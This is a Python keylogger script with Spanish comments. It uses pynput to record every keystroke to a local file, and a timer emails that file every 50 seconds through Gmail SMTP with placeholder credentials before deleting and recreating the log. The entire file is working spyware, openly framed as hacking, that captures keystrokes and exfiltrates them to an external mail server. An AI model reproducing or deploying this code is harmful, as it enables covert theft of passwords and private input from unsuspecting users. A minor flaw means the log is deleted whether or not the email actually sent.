#python3 install pynput #pip install pynput
#encoding ('utf-8')
from pynput.keyboard import Listener
import datetime
import os
import time
import sys
import os.path as path
from threading import Timer

ruta='ek_logger.txt'

fechayhora = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
hora=datetime.datetime.now().strftime('%H-%M-%S');
esperar_tiempo = 50 #Define cada cuando te va a enviar el correo


print('Prepare to be hacked perro')

def timeout(): #función para el final del temporizador
    print('Eso es todo amigos')
    EnvCorreo()
    if(EnvCorreo):
        os.remove(ruta)
    else:
        print("No se eliminó el archivo")
    return init()
    #sys.exit()
def init(): #inicializar contador y crear archivo nuevamente
    if (path.exists(ruta)):
        print('Ya estufas')
    else:
        archivo_log = open(ruta.format(fechayhora), "w")
    t = Timer(esperar_tiempo, timeout)
    t.start()

init()

def EnvCorreo(): #servidor para enviar el correo
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from smtplib import SMTP
    password = '#Tupassword'
    mensaje = MIMEMultipart('plain')
    mensaje['From'] = "tucorreo@gmail.com"
    mensaje['To'] = "tucorreo@gmail.com"
    mensaje['Subject'] ="Esto es el asunto del mensaje"
    archivo_adjunto = MIMEBase("aplication","octect-stream")
    archivo_adjunto.set_payload(open("ek_logger.txt","rb").read())
    archivo_adjunto.add_header("content-Disposition",'attachment; filename="ek_logger.txt"')
    mensaje.attach(archivo_adjunto)
#Abrir el servidor SMTP
    try:
        server = SMTP('smtp.gmail.com: 587')
        server.starttls()
        server.ehlo()
        server.login("tucorreo@gmail.com",password)
        server.ehlo()
        server.sendmail("tucorreo@gmail.com","tucorreo@gmail.com", mensaje.as_string())
        server.quit()
        print("El correo se envio satisfactoriamente")
    except:
        print("Error, no se pudo enviar el correo")


def grabador_teclas(key):
    key=str(key) #Convertir teclas a string


    # esto es para ver si funciona, pruebas mijo pruebas
    print(key,end="")

#Secuencia de teclas para reemplazar
    if key: 
        archivo_log = open(ruta.format(fechayhora), 'a')
        if key == 'Key.enter':
            archivo_log.write('\n')
        elif key == 'Key.space':
            archivo_log.write(' ')
        elif key == 'Key.backspace':
            archivo_log.write('%Del%')
        elif key == 'Key.ctrl':
            archivo_log.write('[ctrl] + ')
        elif key == 'Key.cmd':
            archivo_log.write('[win] \n')
        elif key == 'Key.tab':
            archivo_log.write('   ')
        elif key == 'Key.shift':
            archivo_log.write('[shift]')
        elif key == 'Key.shift_r':
            archivo_log.write(' ')
        elif key == 'Key.caps_lock':
            archivo_log.write('*Mayúsculas activadas*\n')
        elif key == 'Key.left':
            archivo_log.write(' *izquierda* ')
        elif key == 'Key.up':
            archivo_log.write(' *arriba* ')
        elif key == 'Key.right':
            archivo_log.write(' *derecha* ')
        elif key == 'Key.down':
            archivo_log.write(' *abajo* ')
        elif key == 'Key.alt':
            archivo_log.write('[Alt] + ')
        elif key == 'Key.print_screen':
            archivo_log.write('*Captura de pantalla*')
        else:
            archivo_log.write(key.replace("'", ""))
        archivo_log.close()
    
        #Reemplazar comillas por espacios
#Aquí terminan secuencias de teclas

with Listener(on_press=grabador_teclas) as tecla:
    tecla.join() 

"""
aqui escribes las pruebas loco
"""
